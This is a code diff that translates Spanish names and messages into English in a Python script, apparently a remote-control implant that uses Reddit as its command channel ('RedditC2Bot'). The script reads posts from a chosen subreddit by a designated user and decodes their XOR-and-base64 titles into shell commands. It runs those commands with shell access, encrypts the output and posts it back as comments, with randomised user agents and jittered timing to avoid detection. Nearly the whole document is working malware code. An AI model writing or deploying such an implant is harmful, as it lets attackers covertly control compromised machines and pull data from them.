@@ -6,12 +6,12 @@ import random
 import string
 import base64
 
-# Subreddit y usuario autorizados
+# Authorized subreddit and user
 SUBREDDIT_NAME = ""
-USUARIO_COMANDOS = ""
-CLAVE_XOR = ""
+COMMAND_USER = ""
+XOR_KEY = ""
 
-# Configura tus credenciales de Reddit
+# Configure your Reddit credentials
 reddit = praw.Reddit(
     client_id='',
     client_secret='',
@@ -20,47 +20,46 @@ reddit = praw.Reddit(
     user_agent=''
 )
 
-
-def generar_user_agent():
-    plataformas = [
+def generate_user_agent():
+    platforms = [
         "Windows NT 10.0; Win64; x64",
         "X11; Linux x86_64",
         "Macintosh; Intel Mac OS X 10_15_7"
     ]
-    navegador = random.choice(["Firefox", "Chrome", "Edge"])
-    plataforma = random.choice(plataformas)
+    browser = random.choice(["Firefox", "Chrome", "Edge"])
+    platform = random.choice(platforms)
     build = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-    return f"Mozilla/5.0 ({plataforma}) {navegador}/{build} RedditC2Bot"
+    return f"Mozilla/5.0 ({platform}) {browser}/{build} RedditC2Bot"
 
-def xor_cipher(data: str, key: str = CLAVE_XOR, modo="cifrar") -> str:
-    if modo == "cifrar":
+def xor_cipher(data: str, key: str = XOR_KEY, mode="encrypt") -> str:
+    if mode == "encrypt":
         raw = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
         return base64.b64encode(raw.encode()).decode()
-    elif modo == "descifrar":
+    elif mode == "decrypt":
         raw = base64.b64decode(data.encode()).decode()
         return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(raw))
 
-def ejecutar_comando(comando):
-    print(f"[EJECUTANDO DESCIFRADO] {comando}")
+def execute_command(command):
+    print(f"[DECRYPTED EXECUTION] {command}")
     try:
         output = subprocess.check_output(
-            comando, shell=True, stderr=subprocess.STDOUT, timeout=20, text=True
+            command, shell=True, stderr=subprocess.STDOUT, timeout=20, text=True
         )
     except subprocess.CalledProcessError as e:
         output = f"[ERROR]\n{e.output}"
     except Exception as e:
-        output = f"[EXCEPCION]\n{str(e)}"
+        output = f"[EXCEPTION]\n{str(e)}"
     return output[:9500]
 
-def intentar_comentar(post, mensaje):
+def try_comment(post, message):
     while True:
         try:
-            espera = random.randint(7, 15)
-            print(f"[+] Esperando {espera}s antes de comentar...")
-            time.sleep(espera)
-            separador = f"<!--sep-{random.randint(1000,9999)}-->"
-            mensaje_final = mensaje + f"\n{separador}"
-            post.reply(mensaje_final)
+            wait_time = random.randint(7, 15)
+            print(f"[+] Waiting {wait_time}s before commenting...")
+            time.sleep(wait_time)
+            separator = f"<!--sep-{random.randint(1000,9999)}-->"
+            final_message = message + f"\n{separator}"
+            post.reply(final_message)
             return
         except praw.exceptions.APIException as e:
             error_msg = str(e)
@@ -70,18 +69,17 @@ def intentar_comentar(post, mensaje):
                     delay = int(match.group(1))
                     if match.group(2) == "minute":
                         delay *= 60
-                    print(f"[RATE LIMIT] Esperando {delay} segundos...")
+                    print(f"[RATE LIMIT] Waiting {delay} seconds...")
                     time.sleep(delay + random.randint(3, 6))
                 else:
-                    print("[RATE LIMIT] Esperando 12s por precaucion...")
+                    print("[RATE LIMIT] Waiting 12s as a precaution...")
                     time.sleep(12)
             else:
                 raise e
 
-
-def procesar_posts(subreddit):
+def process_posts(subreddit):
     for post in subreddit.new(limit=10):
-        if post.author.name != USUARIO_COMANDOS:
+        if post.author.name != COMMAND_USER:
             continue
         if post.selftext.strip():
             continue
@@ -90,27 +88,27 @@ def procesar_posts(subreddit):
             continue
 
         try:
-            comando = xor_cipher(post.title, modo="descifrar")
-            resultado = ejecutar_comando(comando)
-            respuesta_cifrada = xor_cipher(resultado, modo="cifrar")
-            intentar_comentar(post, respuesta_cifrada)
-            print(f"[OK] Respondido post: {post.id}")
+            command = xor_cipher(post.title, mode="decrypt")
+            result = execute_command(command)
+            encrypted_response = xor_cipher(result, mode="encrypt")
+            try_comment(post, encrypted_response)
+            print(f"[OK] Replied to post: {post.id}")
         except Exception as e:
             print(f"[ERROR post {post.id}] {e}")
 
 def main():
     try:
         subreddit = reddit.subreddit(SUBREDDIT_NAME)
-        print(f"[OK] Agente ejecutor monitorizando r/{SUBREDDIT_NAME}")
+        print(f"[OK] Executor agent monitoring r/{SUBREDDIT_NAME}")
     except Exception as e:
-        print(f"[ERROR] No se pudo acceder al subreddit: {str(e)}")
+        print(f"[ERROR] Could not access subreddit: {str(e)}")
         return
 
     while True:
         try:
-            procesar_posts(subreddit)
+            process_posts(subreddit)
         except Exception as e:
-            print(f"[ERROR ciclo] {e}")
+            print(f"[ERROR loop] {e}")
         time.sleep(random.randint(10, 20))
 
 if __name__ == "__main__":
